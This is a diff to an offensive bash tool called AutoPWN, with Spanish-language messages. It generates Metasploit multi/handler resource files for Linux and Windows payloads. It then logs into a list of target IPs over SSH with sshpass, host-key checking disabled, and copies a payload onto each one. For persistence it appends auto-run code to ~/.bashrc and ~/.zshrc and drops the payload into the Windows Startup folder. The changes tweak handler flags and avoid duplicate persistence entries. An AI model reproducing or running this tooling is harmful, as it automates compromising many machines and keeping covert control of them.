@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.1.2"
+version="1.2"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -113,7 +113,7 @@ echo "use exploit/multi/handler" >> AutoPWN/linmet.txt
 echo "set PAYLOAD $linuxpayload" >> AutoPWN/linmet.txt
 echo "set LHOST $lhost" >> AutoPWN/linmet.txt
 echo "set LPORT $linlport" >> AutoPWN/linmet.txt
-echo "exploit -j" >> AutoPWN/linmet.txt
+echo "exploit -j -z" >> AutoPWN/linmet.txt
 echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                         By Andermd (v$version)\" && echo \"                               LINUX\n\"" >> AutoPWN/linmet.txt
 
 
@@ -126,7 +126,7 @@ echo "use exploit/multi/handler" >> AutoPWN/winmet.txt
 echo "set PAYLOAD $windowspayload" >> AutoPWN/winmet.txt
 echo "set LHOST $lhost" >> AutoPWN/winmet.txt
 echo "set LPORT $winlport" >> AutoPWN/winmet.txt
-echo "exploit -j" >> AutoPWN/winmet.txt
+echo "exploit -j -z" >> AutoPWN/winmet.txt
 echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                         By Andermd (v$version)\" && echo \"                              WINDOWS\n\"" >> AutoPWN/winmet.txt
 
 echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ARCHIVO CREADO\n\n"
@@ -222,7 +222,7 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
         if [ "$startup" = "si" ]; then
             echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO AÑADIR EL EXPLOIT AL INICIO EN EL PC \e[9;32m$ip\e[9;38m\n\n"
             if echo "$OS" | grep -q "LINUX"; then
-                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp \"$linworkdir/$linuxoutname\" ~/$linuxoutname & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
+                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
             else
                 timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" >/dev/null 2>&1
             fi
